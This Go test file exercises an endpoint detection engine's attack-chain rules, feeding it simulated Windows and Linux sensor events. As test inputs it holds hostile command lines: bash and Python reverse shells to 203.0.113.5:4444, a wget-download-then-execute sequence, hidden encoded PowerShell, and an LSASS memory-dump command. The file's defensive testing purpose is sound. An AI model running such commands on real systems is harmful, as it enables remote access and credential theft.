package ioa

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

// q quotes as the Windows sensor does (winevent.Quote): a backslash is
// doubled only before a quote, another backslash or at the end.
func q(v string) string {
	var b strings.Builder
	b.WriteByte('"')
	for i := 0; i < len(v); i++ {
		c := v[i]
		switch {
		case c == '"':
			b.WriteString(`\"`)
		case c == '\\' && (i+1 == len(v) || v[i+1] == '\\' || v[i+1] == '"'):
			b.WriteString(`\\`)
		default:
			b.WriteByte(c)
		}
	}
	b.WriteByte('"')
	return b.String()
}

// Windows sensor lines (winsensor process.go, network.go, file.go, access.go).
func winProc(pid, ppid int, image, cmd, parent string) (string, string) {
	return "windows_etw_process", fmt.Sprintf(`EventID=1 Channel="ETW" ProcessId="%d" Image=%s CommandLine=%s User="CORP\alice" ParentProcessId="%d" ParentImage=%s`,
		pid, q(image), q(cmd), ppid, q(parent))
}

func winNet(pid int, image, dst string) (string, string) {
	return "windows_etw_network", fmt.Sprintf(`EventID=3 Channel="ETW" ProcessId="%d" Image=%s User="CORP\alice" Protocol="tcp" Initiated="true" SourceIp="10.0.0.5" SourcePort="50000" DestinationIp=%s DestinationPort="443"`,
		pid, q(image), q(dst))
}

func winFile(pid int, image, target string) (string, string) {
	return "windows_etw_file", fmt.Sprintf(`EventID=11 Channel="ETW" ProcessId="%d" Image=%s User="CORP\alice" FileAction="create" TargetFilename=%s`,
		pid, q(image), q(target))
}

func winAccess(src int, srcImage string, target int, targetImage, granted string) (string, string) {
	return "windows_etw_access", fmt.Sprintf(`EventID=10 Channel="ETW" SourceProcessId="%d" SourceImage=%s SourceUser="CORP\alice" TargetProcessId="%d" TargetImage=%s GrantedAccess="%s"`,
		src, q(srcImage), target, q(targetImage), granted)
}

// Linux lines (procexec, netwatch, linsensor).
func linKV(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	return `"` + strings.ReplaceAll(s, `"`, `\"`) + `"`
}

func linExec(pid, ppid int, image, cmd, parent string, uid int) (string, string) {
	return "linux_process_exec", fmt.Sprintf(`Image=%s CommandLine=%s PID=%d PPID=%d User=%d ParentImage=%s`,
		linKV(image), linKV(cmd), pid, ppid, uid, linKV(parent))
}

func linNet(pid int, comm, dst string) (string, string) {
	return "linux_network_connect", fmt.Sprintf(`ts=2026-11-11T00:00:00Z pid=%d tgid=%d uid=33 gid=33 comm=%s action=network_connect proto=tcp direction=outbound src=10.0.0.5 dport=4444 dst=%s lport=50000 host=h private_dst=false`,
		pid, pid, comm, dst)
}

func linFile(pid, ppid int, image, target string) (string, string) {
	return "linux_file_event", fmt.Sprintf(`action=create TargetFilename=%s Image=%s Comm="x" PID=%d PPID=%d User=1000`,
		linKV(target), linKV(image), pid, ppid)
}

type harness struct {
	e     *Engine
	now   time.Time
	lines []string
	excl  func(image, cmd string) bool
	mode  string
}

func newHarness(t *testing.T, goos string) *harness {
	h := &harness{now: time.Date(2026, 11, 11, 10, 0, 0, 0, time.UTC), mode: "detect"}
	h.e = New(Options{
		GOOS: goos, Self: 999,
		Now:  func() time.Time { return h.now },
		Mode: func() string { return h.mode },
		Push: func(logType, line string) {
			if logType != LogType {
				t.Fatalf("log type %q", logType)
			}
			h.lines = append(h.lines, line)
		},
		Excluded: func(image, cmd string) bool { return h.excl != nil && h.excl(image, cmd) },
	})
	return h
}

func (h *harness) feed(logType, line string) { h.e.Feed(logType, line) }

func (h *harness) wait(d time.Duration) { h.now = h.now.Add(d) }

func (h *harness) rules() []string {
	var out []string
	for _, l := range h.lines {
		out = append(out, fields(l)["rule"])
	}
	return out
}

const (
	word = `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`
	ps   = `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	expl = `C:\Windows\explorer.exe`
)

func TestOfficeChildInternet(t *testing.T) {
	h := newHarness(t, "windows")
	h.feed(winProc(100, 50, word, `"`+word+`" /n "C:\Users\alice\Downloads\invoice.docm"`, expl))
	h.feed(winProc(200, 100, ps, `powershell -nop -w hidden -c "iex(...)"`, word))
	h.feed(winNet(200, ps, "203.0.113.9"))
	if got := h.rules(); len(got) != 1 || got[0] != "ioa_office_child_internet" {
		t.Fatalf("rules = %v", got)
	}
	f := fields(h.lines[0])
	if f["severity"] != "high" || f["technique"] != "T1566.001" || f["image"] != ps || f["anchor_image"] != word ||
		f["parent_image"] != expl || f["pid"] != "200" || f["anchor_pid"] != "100" {
		t.Fatalf("fields = %v", f)
	}
	if !strings.Contains(f["chain"], "203.0.113.9:443") || !strings.Contains(f["chain"], "winword.exe") {
		t.Fatalf("chain = %q", f["chain"])
	}
	// the same chain again: in cooldown
	h.feed(winProc(300, 100, ps, `powershell -c x`, word))
	h.feed(winNet(300, ps, "203.0.113.9"))
	if len(h.lines) != 1 {
		t.Fatalf("cooldown: %v", h.rules())
	}
}

func TestOfficeOwnTrafficOrPrivateIsNotEnough(t *testing.T) {
	h := newHarness(t, "windows")
	h.feed(winProc(100, 50, word, word, expl))
	h.feed(winNet(100, word, "52.109.0.1")) // Office's own cloud traffic
	h.feed(winProc(200, 100, ps, "powershell", word))
	h.feed(winNet(200, ps, "10.1.2.3")) // a private address
	h.feed(winNet(100, word, "52.109.0.2"))
	if len(h.lines) != 0 {
		t.Fatalf("unexpected: %v", h.rules())
	}
}

func TestNetworkBeforeProcessLine(t *testing.T) {
	// Windows sends a process's first connections before its (joined) start line.
	h := newHarness(t, "windows")
	h.feed(winProc(100, 50, word, word, expl))
	h.feed(winNet(200, ps, "198.51.100.7"))
	h.wait(2 * time.Second)
	h.feed(winProc(200, 100, ps, "powershell -enc AAAA", word))
	if got := h.rules(); len(got) != 1 || got[0] != "ioa_office_child_internet" {
		t.Fatalf("rules = %v", got)
	}
}

func TestOfficeDropThenRun(t *testing.T) {
	h := newHarness(t, "windows")
	drop := `C:\Users\alice\AppData\Local\Temp\upd.exe`
	h.feed(winProc(100, 50, word, word, expl))
	h.feed(winFile(100, word, drop))
	h.wait(time.Minute)
	// run by someone else (explorer: the user double-clicked it), path case differs
	h.feed(winProc(400, 60, strings.ToUpper(drop[:3])+drop[3:], drop, expl))
	if got := h.rules(); len(got) != 1 || got[0] != "ioa_office_drop_exec" {
		t.Fatalf("rules = %v", got)
	}
}

func TestLsassFromShell(t *testing.T) {
	h := newHarness(t, "windows")
	dump := `C:\Users\Public\pd64.exe`
	h.feed(winProc(10, 5, `C:\Windows\System32\cmd.exe`, "cmd.exe", expl))
	h.feed(winProc(11, 10, dump, dump+` -ma lsass.exe`, `C:\Windows\System32\cmd.exe`))
	h.feed(winAccess(11, dump, 700, `C:\Windows\System32\lsass.exe`, "0x1410"))
	got := h.rules()
	if len(got) != 1 || got[0] != "ioa_lsass_access_from_shell" || fields(h.lines[0])["severity"] != "critical" {
		t.Fatalf("rules = %v", got)
	}
	// only PROCESS_QUERY_LIMITED_INFORMATION: no detection
	h2 := newHarness(t, "windows")
	h2.feed(winProc(11, 10, dump, dump, `C:\Windows\System32\cmd.exe`))
	h2.feed(winAccess(11, dump, 700, `C:\Windows\System32\lsass.exe`, "0x1000"))
	if len(h2.lines) != 0 {
		t.Fatalf("query access: %v", h2.rules())
	}
}

func TestWindowExpires(t *testing.T) {
	h := newHarness(t, "windows")
	h.feed(winProc(100, 50, word, word, expl))
	h.feed(winProc(200, 100, ps, "powershell", word))
	h.wait(6 * time.Minute)
	h.feed(winNet(200, ps, "203.0.113.9"))
	if len(h.lines) != 0 {
		t.Fatalf("after the window: %v", h.rules())
	}
}

func TestPIDReuseIsNotUnderTheOldTree(t *testing.T) {
	h := newHarness(t, "windows")
	h.feed(winProc(100, 50, word, word, expl))
	h.feed(winProc(200, 100, ps, "powershell", word))
	// pid 200 is reused by an unrelated process started by explorer
	h.feed(winProc(200, 60, `C:\Tools\sync.exe`, "sync.exe", expl))
	h.feed(winNet(200, `C:\Tools\sync.exe`, "203.0.113.9"))
	if len(h.lines) != 0 {
		t.Fatalf("reused pid: %v", h.rules())
	}
}

func TestExclusionModeAndSelf(t *testing.T) {
	chain := func(h *harness, base int) {
		h.feed(winProc(base, 999, word, word, expl))
		h.feed(winProc(base+1, base, ps, "powershell", word))
		h.feed(winNet(base+1, ps, "203.0.113.9"))
	}
	h := newHarness(t, "windows")
	chain(h, 100) // under the agent (pid 999): ignored
	if len(h.lines) != 0 {
		t.Fatalf("agent's own children: %v", h.rules())
	}
	h = newHarness(t, "windows")
	h.excl = func(image, _ string) bool { return strings.HasSuffix(strings.ToLower(image), "winword.exe") }
	h.feed(winProc(100, 50, word, word, expl))
	h.feed(winProc(101, 100, ps, "powershell", word))
	h.feed(winNet(101, ps, "203.0.113.9"))
	if len(h.lines) != 0 {
		t.Fatalf("excluded: %v", h.rules())
	}
	h = newHarness(t, "windows")
	h.mode = "off"
	h.feed(winProc(100, 50, word, word, expl))
	h.feed(winProc(101, 100, ps, "powershell", word))
	h.feed(winNet(101, ps, "203.0.113.9"))
	if len(h.lines) != 0 {
		t.Fatalf("mode off: %v", h.rules())
	}
}

func TestLinuxWebShell(t *testing.T) {
	h := newHarness(t, "linux")
	h.feed(linExec(500, 1, "/usr/sbin/nginx", "nginx: worker process", "/usr/sbin/nginx", 33))
	h.feed(linExec(501, 500, "/bin/sh", "sh -c id", "/usr/sbin/nginx", 33))
	h.feed(linExec(502, 501, "/usr/bin/id", "id", "/bin/sh", 33))
	if got := h.rules(); len(got) != 1 || got[0] != "ioa_webserver_shell" {
		t.Fatalf("rules = %v", got)
	}
	// a versioned php-fpm binary
	h3 := newHarness(t, "linux")
	h3.feed(linExec(701, 700, "/bin/sh", "sh -c whoami", "/usr/sbin/php-fpm8.2", 33))
	h3.feed(linExec(702, 701, "/usr/bin/whoami", "whoami", "/bin/sh", 33))
	if got := h3.rules(); len(got) != 1 || got[0] != "ioa_webserver_shell" {
		t.Fatalf("php-fpm8.2: %v", got)
	}
	// a shell under the web server that only resizes an image: nothing
	h2 := newHarness(t, "linux")
	h2.feed(linExec(601, 600, "/bin/sh", "sh -c convert a.png b.png", "/usr/sbin/php-fpm8.2", 33))
	h2.feed(linExec(602, 601, "/usr/bin/convert", "convert a.png b.png", "/bin/sh", 33))
	if len(h2.lines) != 0 {
		t.Fatalf("benign: %v", h2.rules())
	}
}

func TestLinuxReverseShell(t *testing.T) {
	h := newHarness(t, "linux")
	h.feed(linExec(700, 1, "/bin/bash", `bash -c "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"`, "/usr/bin/python3", 1000))
	h.feed(linNet(700, "bash", "203.0.113.5"))
	got := h.rules()
	if len(got) != 1 || got[0] != "ioa_reverse_shell" || fields(h.lines[0])["severity"] != "critical" {
		t.Fatalf("rules = %v", got)
	}
	h2 := newHarness(t, "linux")
	h2.feed(linExec(710, 1, "/usr/bin/python3.11", `python3.11 -c "import socket,pty;s=socket.socket();s.connect(('203.0.113.5',4444));pty.spawn('/bin/sh')"`, "/bin/bash", 1000))
	h2.feed(linNet(710, "python3.11", "203.0.113.5"))
	if got := h2.rules(); len(got) != 1 || got[0] != "ioa_reverse_shell" {
		t.Fatalf("python3.11: %v", got)
	}
	// a python program that just talks to an API: nothing
	h3 := newHarness(t, "linux")
	h3.feed(linExec(720, 1, "/usr/bin/python3", "python3 /opt/app/sync.py", "/bin/bash", 1000))
	h3.feed(linNet(720, "python3", "203.0.113.5"))
	if len(h3.lines) != 0 {
		t.Fatalf("benign python: %v", h3.rules())
	}
}

func TestLinuxDownloadThenRelativeExec(t *testing.T) {
	h := newHarness(t, "linux")
	h.feed(linExec(800, 1, "/usr/bin/wget", "wget -O /tmp/.x http://203.0.113.5/x", "/bin/bash", 1000))
	h.feed(linFile(800, 1, "/usr/bin/wget", "/tmp/.x"))
	h.feed(linExec(801, 1, "./.x", "./.x", "/bin/bash", 1000)) // run from /tmp
	if got := h.rules(); len(got) != 1 || got[0] != "ioa_download_then_exec" {
		t.Fatalf("rules = %v", got)
	}
	// a different file with the same name elsewhere: nothing
	h2 := newHarness(t, "linux")
	h2.feed(linExec(800, 1, "/usr/bin/wget", "wget", "/bin/bash", 1000))
	h2.feed(linFile(800, 1, "/usr/bin/wget", "/tmp/tool"))
	h2.feed(linExec(801, 1, "/usr/local/bin/tool", "tool", "/bin/bash", 1000))
	if len(h2.lines) != 0 {
		t.Fatalf("other file: %v", h2.rules())
	}
}

func TestLinuxTmpBinaryBecomesRoot(t *testing.T) {
	h := newHarness(t, "linux")
	h.feed(linExec(900, 1, "/tmp/pwn", "/tmp/pwn", "/bin/bash", 1000))
	h.feed("linux_privilege_change", `action=setuid IDs="0" Image="/tmp/pwn" Comm="pwn" PID=900 PPID=1 User=1000 EUID=0 ParentImage="/bin/bash"`)
	if got := h.rules(); len(got) != 1 || got[0] != "ioa_tmp_exec_root" {
		t.Fatalf("rules = %v", got)
	}
}

func TestRulesPerOS(t *testing.T) {
	ids := map[string]bool{}
	for _, r := range Rules() {
		if ids[r.ID] {
			t.Fatalf("duplicate id %s", r.ID)
		}
		ids[r.ID] = true
		if r.Window <= 0 || len(r.Steps) < 2 || r.Steps[0].Keyed {
			t.Fatalf("%s: window and at least two steps, the first not keyed", r.ID)
		}
		switch r.Severity {
		case "medium", "high", "critical":
		default:
			t.Fatalf("%s: severity %q", r.ID, r.Severity)
		}
		for i, s := range r.Steps {
			if s.Keyed && (i == 0 || r.Steps[i-1].Capture == nil) {
				t.Fatalf("%s: keyed step %d without a capture before it", r.ID, i)
			}
		}
	}
	if New(Options{GOOS: "linux"}).RuleCount() == New(Options{GOOS: "windows"}).RuleCount() {
		t.Log("same rule count on both OSes")
	}
}

func TestFieldsRoundTrip(t *testing.T) {
	f := fields(`EventID=1 Image="C:\Windows\x.exe" CommandLine="\"C:\a b\\\" -x" Share="\\\server\s" bare n=5`)
	if f["Image"] != `C:\Windows\x.exe` || f["CommandLine"] != `"C:\a b\" -x` || f["Share"] != `\\server\s` || f["n"] != "5" {
		t.Fatalf("fields = %#v", f)
	}
	l := Line(Detection{Rule: Rules()[0], Action: "detected", Image: `C:\a\"q".exe`, CommandLine: "a\nb",
		Chain: []string{"x", "y"}})
	g := fields(l)
	if g["image"] != `C:\a\"q".exe` || g["command_line"] != "a b" || g["chain"] != "x > y" || g["event"] != "ioa" {
		t.Fatalf("line fields = %#v", g)
	}
}

func TestObserveFiltersAndNeverBlocks(t *testing.T) {
	e := New(Options{GOOS: "windows"})
	for i := 0; i < queueSize+10; i++ {
		e.Observe("windows_etw_process\x00\x00EventID=1")
	}
	e.Observe("linux_auth\x00\x00x") // not read
	if e.dropped.Load() != 10 || len(e.in) != queueSize {
		t.Fatalf("dropped %d queued %d", e.dropped.Load(), len(e.in))
	}
}
